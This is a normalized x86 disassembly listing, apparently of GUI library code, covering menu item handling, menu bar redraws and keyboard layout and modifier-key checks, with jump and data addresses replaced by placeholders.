retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_3aa6e18
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_3aa6e38
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_3aa6e58
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_3aa6e78
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_3aa6e98
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_3aa6eb8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_3aa6ed8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_3aa6ef8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_3a7abb4
movzx edx [ ebx + 0x39 ]
mov edi esi
mov eax edi
call sub_3ac0dfc
mov edx [ ebx + 0x54 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x58 ]
mov eax edi
call sub_3ac0f38
mov edx [ ebx + 0x40 ]
mov eax edi
call sub_3ac0f98
mov edx [ ebx + 0x30 ]
mov eax edi
call sub_3ac0c94
movzx edx [ ebx + 0x3e ]
mov eax edi
call sub_3ac1058
push [ ebx + 0x8c ]
push [ ebx + 0x88 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_3aa6f74
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_3a83994
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_3aa667c
cmp edi eax
jne r-xdata
cmp edi [ esi + 0x7c ]
jne r-xdata
xor edx edx
mov eax esi
call sub_3aa6b1c
jmp r-xdata
cmp edi [ esi + 0x68 ]
jne r-xdata
xor edx edx
mov eax esi
call sub_3aa6fc8
jmp r-xdata
xor edx edx
mov eax esi
call sub_3aa39a0
sub_3aa6fc8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x7c ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x7c ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x78 ]
call sub_3abf5ac
mov eax ebx
call sub_3aa7038
pop esi
pop ebx
retn
mov edx [ ebx + 0x78 ]
call sub_3abf5f0
mov edx ebx
mov eax [ ebx + 0x7c ]
call sub_3a83738
sub_3aa7010
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_3aa7010
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_3aa301c
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_3aa6a9c
mov eax ebx
pop esi
pop ebx
retn
sub_3aa704c
push ebp
mov ebp esp
push ebx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_3a6e0bc
test eax eax
setne bl
test bl bl
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
add edx 0xfffffffc
mov ecx 0x1
xchg edx eax
call sub_3a657d8
sub_3aa707c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_3a65338
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
pop ecx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_3aa7100
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_3aa7243
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
test eax eax
je r-xdata
test eax eax
jle r-xdata
sub eax 0x4
mov eax [ eax ]
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov esi 0x1
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov esi [ ebp - 0x10 ]
test esi esi
je r-xdata
inc esi
dec eax
jne r-xdata
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aa724a
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_3a652c4
retn
mov edx ebx
mov ecx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a65820
lea eax [ ebp - 0x14 ]
push eax
mov edx esi
sub edx 0x3
inc edx
mov eax [ ebx ]
mov ecx 0x3
call sub_3a65798
mov eax [ ebp - 0x14 ]
mov edx r-xdata
call sub_3a656c8
jne r-xdata
sub esi 0x4
mov esi [ esi ]
mov edx [ ebx ]
movzx edx [ edx + esi - 0x1 ]
mov ecx [ rw-data ]
movzx edx dl
bt [ ecx ] edx
jae r-xdata
push [ ebx ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
mov eax ebx
mov edx 0x5
call sub_3a65634
jmp r-xdata
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov esi [ ebp - 0x10 ]
test esi esi
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ecx esi
sub ecx 0x3
mov eax [ ebx ]
mov edx 0x1
call sub_3a65798
push [ ebp - 0x18 ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
push r-xdata
mov eax ebx
mov edx 0x6
call sub_3a65634
jmp r-xdata
sub esi 0x4
mov esi [ esi ]
sub_3aa7280
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x25 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_3aa7708
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x26 ] 0x0
cmp [ ebp - 0x25 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_3a65338
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_3aa76d1
push [ fs : edx ]
mov [ fs : edx ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebp - 0x2c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_3aa6694
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
lea eax [ ebp - 0x24 ]
mov edx [ ebp - 0x4 ]
call sub_3a65338
mov eax [ ebp - 0x2c ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x34 ] eax
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aa770f
lea eax [ ebp - 0x44 ]
mov edx 0x4
call sub_3a652c4
lea eax [ ebp - 0x24 ]
mov edx 0x4
call sub_3a652c4
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
mov eax ebx
call sub_3aa78c0
test al al
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
inc eax
mov [ ebp - 0x34 ] eax
inc esi
dec [ ebp - 0x34 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_3aa66a4
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_3a656c8
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg [ ebp - 0x26 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_3aa707c
pop ecx
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebp - 0x10 ]
jle r-xdata
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx 0x1
jmp r-xdata
mov edx esi
mov eax ebx
call sub_3aa66a4
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_3aa66a4
cmp [ eax + 0x30 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_3a64380
mov eax [ ebp - 0x2c ]
call sub_3a64380
mov eax [ ebp - 0x14 ]
call sub_3a64380
mov eax [ ebp - 0xc ]
call sub_3a64380
retn
inc eax
mov [ ebp - 0x34 ] eax
xor esi esi
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
push ebp
call sub_3aa707c
pop ecx
mov eax [ ebp - 0x20 ]
call sub_3a65560
cmp ebx eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_3aa66a4
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x38 ]
call sub_3aa9478
mov eax [ ebp - 0x38 ]
lea edx [ ebp - 0x1c ]
call sub_3a691e8
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
add eax 0x30
mov edx [ ebp - 0x20 ]
call sub_3a652f4
inc esi
dec [ ebp - 0x34 ]
jne r-xdata
mov edx [ ebp - 0x20 ]
mov eax r-xdata
call sub_3a6e0bc
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x20 ]
movzx eax [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
movzx eax al
bt [ edx ] eax
jae r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x1c ]
call sub_3a6e0bc
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_3aa66a4
push eax
mov edx esi
mov eax ebx
call sub_3aa66a4
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x2c ]
mov edi [ eax ]
call [ edi + 0x64 ]
jmp r-xdata
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
dec [ ebp - 0x34 ]
jne r-xdata
inc edi
xor esi esi
lea eax [ ebp - 0x40 ]
push eax
mov ecx 0x1
mov edx ebx
mov eax [ ebp - 0x20 ]
call sub_3a65798
mov eax [ ebp - 0x40 ]
lea edx [ ebp - 0x1c ]
call sub_3a691e8
push ebp
mov eax [ ebp - 0x1c ]
call sub_3aa704c
pop ecx
test al al
je r-xdata
inc ebx
jmp r-xdata
push ebp
mov eax [ ebp - 0x1c ]
call sub_3aa704c
pop ecx
test al al
jne r-xdata
mov edx [ ebp - 0x20 ]
mov eax r-xdata
call sub_3a6e0bc
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x24 ]
call sub_3a65338
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx eax
mov eax [ ebp - 0x2c ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov ebx eax
mov eax [ ebp - 0x2c ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ecx eax
dec ecx
mov edx ebx
mov eax [ ebp - 0x2c ]
mov ebx [ eax ]
call [ ebx + 0x70 ]
inc esi
dec edi
jne r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_3aa66a4
add eax 0x30
push eax
mov edx esi
mov eax ebx
call sub_3aa66a4
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x3c ]
call sub_3aa9388
mov edx [ ebp - 0x3c ]
pop eax
call sub_3a652f4
mov edx esi
mov eax ebx
call sub_3aa66a4
push eax
mov edx esi
mov eax ebx
call sub_3aa66a4
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x2c ]
mov edi [ eax ]
call [ edi + 0x64 ]
mov ebx [ ebp - 0x18 ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x20 ]
mov ecx ebx
mov eax r-xdata
call sub_3a65820
lea eax [ ebp - 0x20 ]
mov ecx ebx
mov edx [ ebp - 0x1c ]
call sub_3aa7100
jmp r-xdata
lea eax [ ebp - 0x44 ]
push eax
mov ecx 0x1
mov edx ebx
mov eax [ ebp - 0x18 ]
call sub_3a65798
mov edx [ ebp - 0x44 ]
lea eax [ ebp - 0x20 ]
xor ecx ecx
call sub_3aa7100
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov ecx 0x1
xchg edx eax
call sub_3a657d8
sub eax 0x4
mov eax [ eax ]
sub_3aa7768
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov [ esp ] 0x0
test bl bl
jne r-xdata
xor eax eax
mov [ esp + 0x4 ] eax
xor ebp ebp
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_3aa6694
mov edi eax
dec edi
sub edi ebx
jl r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_3aa6694
mov edi eax
dec edi
sub edi ebx
jl r-xdata
inc edi
movzx eax [ esp ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_3aa78f0
test al al
je r-xdata
mov eax esi
call sub_3aa6694
mov ebx eax
dec ebx
mov edi [ esp + 0x4 ]
sub edi ebx
jg r-xdata
inc edi
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_3aa66a4
call sub_3aa7744
test al al
je r-xdata
dec edi
mov edx ebx
mov eax esi
call sub_3aa66a4
cmp [ eax + 0x3e ] 0x0
je r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_3aa66a4
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov edx ebx
mov eax esi
call sub_3aa66a4
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
jmp r-xdata
dec ebx
inc edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_3aa66a4
call sub_3aa7744
test al al
je r-xdata
inc ebx
dec edi
jne r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_3aa66a4
mov ebp eax
jmp r-xdata
cmp [ ebp + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_3aa66a4
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_3aa66a4
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
mov edx ebx
mov eax esi
call sub_3aa66a4
call sub_3aa7744
test al al
je r-xdata
xor ebp ebp
mov [ esp + 0x4 ] ebx
cmp [ ebp + 0x3e ] 0x0
jne r-xdata
mov [ ebp + 0x3e ] 0x0
mov [ esp ] 0x1
mov [ ebp + 0x3e ] 0x1
mov [ esp ] 0x1
sub_3aa78c0
push ebx
mov ebx eax
movzx eax [ ebx + 0x3b ]
cmp al 0x2
jne r-xdata
and eax 0x7f
movzx eax [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_3aa78c0
and eax 0x7f
movzx eax [ eax + rw-data ]
sub_3aa78f0
push ebx
mov ebx eax
movzx eax [ ebx + 0x3c ]
cmp al 0x2
jne r-xdata
and eax 0x7f
movzx eax [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_3aa78f0
and eax 0x7f
movzx eax [ eax + rw-data ]
sub_3aa7920
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_3aa34b4
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0x84 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x38 ]
mov [ esi + 0x80 ] eax
mov [ esi + 0x70 ] ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov esi eax
mov [ ebx + 0x44 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] r-xdata
mov [ ebx + 0x41 ] 0x1
mov ecx edi
xor edx edx
mov eax ebx
call sub_3a83664
mov eax [ ebx + 0x34 ]
mov [ eax + 0x3b ] 0x0
mov [ eax + 0x3c ] 0x0
mov eax ebx
call sub_3aa88d0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3aa79cc
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
mov eax [ esi + 0x34 ]
call sub_3a64380
mov eax [ esi + 0x44 ]
call sub_3a64380
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3a836b0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3aa7a40
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_3aa7a40
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_3aa301c
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_3aa6a9c
mov eax ebx
pop esi
pop ebx
retn
sub_3aa7a80
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x50 ]
cmp eax edx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp eax [ ebx + 0x34 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] ebx
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax ebx
call sub_3aa6694
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x60 ]
cmp eax edx
jne r-xdata
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax ebx
call sub_3aa66a4
call sub_3aa7a80
pop ecx
test al al
je r-xdata
sub_3aa7b18
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] cl
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0xc ] edx
mov ecx sub_3aa7a80
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_3aa301c
mov eax [ ebp - 0xc ]
pop ebx
mov esp ebp
pop ebp
retn
sub_3aa7b48
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebp edx
mov esi eax
xor edi edi
mov bl 0x1
cmp [ esp ] 0x0
je r-xdata
cmp bl 0x1
jne r-xdata
xor ebx ebx
mov ecx ebx
mov edx ebp
mov eax esi
call sub_3aa7b18
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
cmp ebp eax
jne r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x54 ] 0x0
je r-xdata
mov eax esi
call sub_3aa90ec
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x54 ]
mov eax [ eax + 0x64 ]
sub_3aa7bb8
push ebx
xor ebx ebx
movzx edx dx
xor ecx ecx
call sub_3aa7b18
test eax eax
je r-xdata
mov eax ebx
pop ebx
retn
mov edx [ eax ]
call [ edx + 0x44 ]
mov bl 0x1
sub_3aa7bd4
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov cl 0x1
mov eax esi
call sub_3aa7b18
mov edi eax
test edi edi
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
test [ edi + 0x1c ] 0x10
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
xor edx edx
mov eax edi
call sub_3aa7280
mov ebx eax
xor edx edx
mov eax edi
call sub_3aa7768
or bl al
test bl bl
je r-xdata
mov eax edi
call sub_3aa6bc0
mov eax [ esi + 0x34 ]
call sub_3aa6bc0
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax edi
call sub_3aa3a18
mov bl 0x1
jmp r-xdata
mov edx [ rw-data ]
mov ebx eax
cmp [ ebx + 0x277 ] 0x2
jne r-xdata
cmp edi [ ebx + 0x2a0 ]
jne r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ ebx + 0x29c ]
push eax
call __imp_SendMessageA
test eax eax
je r-xdata
mov eax ebx
call sub_3ab7c38
push eax
call DrawMenuBar
sub_3aa7cb0
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor eax eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3aa7de3
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x16 ] 0x0
lea eax [ ebp - 0x16 ]
push eax
call GetKeyboardLayoutNameA
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a86f20
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_3aa7db9
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx 0x80000002
mov eax [ ebp - 0xc ]
call sub_3a86fc0
lea eax [ ebp - 0x20 ]
lea edx [ ebp - 0x16 ]
mov ecx 0xa
call sub_3a65510
mov ecx [ ebp - 0x20 ]
lea eax [ ebp - 0x1c ]
mov edx r-xdata
call sub_3a655b8
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
call sub_3a87024
lea ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax [ ebp - 0xc ]
call sub_3a8726c
mov edx 0x8000
mov eax [ ebp - 0x4 ]
call sub_3a6f088
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_3aa7d9c
push [ fs : edx ]
mov [ fs : edx ] esp
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call GetProcAddress
mov ebx eax
call ebx
movzx eax [ eax + 0x28 ]
and ax 0x1
cmp ax 0x1
sete [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aa7da3
mov eax [ ebp - 0x8 ]
push eax
call FreeLibrary
retn
sub_3aa7e54
push ebx
xor ebx ebx
push 0xa5
call GetKeyState
test ax ax
jge r-xdata
mov eax ebx
pop ebx
retn
push 0x0
call GetKeyboardLayout
mov ebx eax
cmp ebx [ rw-data ]
je r-xdata
movzx ebx [ rw-data ]
call sub_3aa7cb0
mov [ rw-data ] ebx
sub_3aa7e90
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movzx ebx [ esp + 0x4 ]
test bx bx
je r-xdata
mov eax ebx
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
add bx 0x2000
test [ esp + 0xb ] 0x20
je r-xdata
add bx 0x4000
add bx 0x8000
sub_3aa7ef0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
movzx eax [ ebp - 0x1 ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ esi + 0x1 ]
lea eax [ ebp - 0x8 ]
call sub_3aa7ef0
pop ecx
mov [ ebp - 0x1 ] al
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub al 0x3
je r-xdata
cmp [ ebp - 0x1 ] 0x2
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
xor eax eax
push ebp
push sub_3aa8016
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
movzx edx [ eax - 0x6 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov cl 0x2
call sub_3aa7b18
